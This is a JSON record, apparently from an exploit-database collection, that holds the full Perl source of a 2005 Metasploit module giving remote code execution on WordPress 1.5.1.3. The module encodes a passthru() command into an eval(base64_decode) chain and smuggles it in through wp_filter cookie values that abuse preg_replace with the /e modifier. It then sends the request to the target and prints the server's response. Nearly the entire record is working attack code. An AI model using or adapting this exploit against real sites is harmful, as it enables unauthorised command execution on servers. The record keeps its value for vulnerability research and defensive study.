{
  "id": "1145",
  "title": "WordPress Core 1.5.1.3 - Remote Code Execution (Metasploit)",
  "cve": null,
  "vuln_type": "rce",
  "code": "##\r\n#        Title:  Wordpress <= 1.5.1.3 Remote Code Execution eXploit (metasploit)\r\n#    Name: php_wordpress.pm\r\n# License: Artistic/BSD/GPL\r\n#         Info: I lub metasploit yummmm (str0ke ! milw0rm.com).\r\n#\r\n# Recoded Kartoffelguru's php code for metasploit.  I love cookies. /str0ke\r\n#  \r\n#\r\n#\r\n#  - This is an exploit module for the Metasploit Framework, please see\r\n#     http://metasploit.com/projects/Framework for more information.\r\n# \r\n##\r\n\r\npackage Msf::Exploit::php_wordpress;\r\nuse base \"Msf::Exploit\";\r\nuse strict;\r\nuse Pex::Text;\r\nuse bytes;\r\n\r\nmy $advanced = { };\r\n\r\nmy $info = {\r\n        'Name'     => 'Wordpress <= 1.5.1.3 Remote Code Execution eXploit',\r\n        'Version'  => '$Revision: 1.0 $',\r\n        'Authors'  => [ 'str0ke' ],\r\n        'Arch'     => [ ],\r\n        'OS'       => [ ],\r\n        'Priv'     => 0,\r\n        'UserOpts' =>\r\n          {\r\n                'RHOST' => [1, 'ADDR', 'The target address'],\r\n                'RPORT' => [1, 'PORT', 'The target port', 80],\r\n                'VHOST' => [0, 'DATA', 'The virtual host name of the server'],\r\n                'RPATH' => [1, 'DATA', 'Path WordPress root directory', '/'],\r\n                'SSL'   => [0, 'BOOL', 'Use SSL'],\r\n          },\r\n\r\n        'Description' => Pex::Text::Freeform(qq{\r\n                This module exploits a code execution exploit in wordpress blog <= 1.5.1.3.\r\n}),\r\n\r\n        'Refs' =>\r\n          [\r\n                ['MIL', '1142'],\r\n          ],\r\n\r\n        'Payload' =>\r\n          {\r\n                'Space' => 512,\r\n                'Keys'  => ['cmd', 'cmd_bash'],\r\n          },\r\n\r\n        'Keys' => ['wordpress'],\r\n  };\r\n\r\nsub new {\r\n        my $class = shift;\r\n        my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);\r\n        return($self);\r\n}\r\n\r\nsub Exploit {\r\n        my $self = shift;\r\n        my $target_host    = $self->GetVar('RHOST');\r\n        my $target_port    = $self->GetVar('RPORT');\r\n        my $vhost          = $self->GetVar('VHOST') || $target_host;\r\n        my $path           = $self->GetVar('RPATH');\r\n        my $cmd            = $self->GetVar('EncodedPayload')->RawPayload;\r\n\r\n        my $encoded = Pex::Text::Base64Encode(\"passthru(\\\"$cmd\\\");\");\r\n        $encoded =~ s/\\n//gm;\r\n\r\n        my $byte = join('.', map { $_ = 'chr('.$_.')' } unpack('C*', $encoded));\r\n\r\n        $byte.=\".chr(32)\";\r\n\r\n        my $str = Pex::Text::Base64Encode('args[0]=eval(base64_decode('.$byte.')).die()&args[1]=x');\r\n\r\n        $str =~ s/\\n//gm;\r\n\r\n        my $data = \"wp_filter[query_vars][0][0][function]=get_lastpostdate;wp_filter[query_vars][0][0][accepted_args]=0;\".\r\n                   \"wp_filter[query_vars][0][1][function]=base64_decode;wp_filter[query_vars][0][1][accepted_args]=1;\".\r\n                   \"cache_lastpostmodified[server]=//e;cache_lastpostdate[server]=$str\".\r\n                   \";wp_filter[query_vars][1][0][function]=parse_str;wp_filter[query_vars][1][0][accepted_args]=1;\".\r\n                   \"wp_filter[query_vars][2][0][function]=get_lastpostmodified;wp_filter[query_vars][2][0][accepted_args]=0;\".\r\n                   \"wp_filter[query_vars][3][0][function]=preg_replace;wp_filter[query_vars][3][0][accepted_args]=3;\";\r\n\r\n        my $req =\r\n                \"GET $path HTTP/1.0\\r\\n\".\r\n                \"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)\\r\\n\".\r\n                \"Host: $vhost:$target_port\\r\\n\".\r\n                \"Pragma: no-cache\\r\\n\".\r\n                \"Accept: */*\\r\\n\".\r\n                \"Cookie: $data\\r\\n\".\r\n                \"\\r\\n\";\r\n\r\n        my $s = Msf::Socket::Tcp->new(\r\n                'PeerAddr'  => $target_host,\r\n                'PeerPort'  => $target_port,\r\n                'LocalPort' => $self->GetVar('CPORT'),\r\n                'SSL'       => $self->GetVar('SSL'),\r\n\r\n          );\r\n\r\n        if ($s->IsError){\r\n                $self->PrintLine('[*] Error creating socket: ' . $s->GetError);\r\n                return;\r\n        }\r\n\r\n        $self->PrintLine(\"[*] Sending the malicious WordPress Get request...\");\r\n\r\n        $s->Send($req);\r\n\r\n        my $results = $s->Recv(-1, 20);\r\n        $s->Close();\r\n        $self->PrintLine($results);\r\n\r\n        return;\r\n}\r\n\r\n1;\r\n\r\n# milw0rm.com [2005-08-10]",
  "url": "https://www.exploit-db.com/exploits/1145"
}